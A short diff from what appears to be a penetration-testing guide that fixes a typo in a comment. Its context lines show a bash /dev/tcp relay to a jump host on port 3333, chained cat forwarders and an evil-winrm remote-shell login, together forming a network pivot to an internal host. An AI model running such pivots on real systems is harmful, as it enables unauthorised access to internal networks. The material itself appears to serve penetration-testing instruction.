@@ -34,7 +34,7 @@ exec 4<>/dev/tcp/Jump/3333
 cat <&3 >&4 &
 cat <&4 >&3 &
 
-# Fom the host, you can now access InternalB from the Jump server
+# From the host, you can now access InternalB from the Jump server
 evil-winrm -u username -i Jump
 ```
 
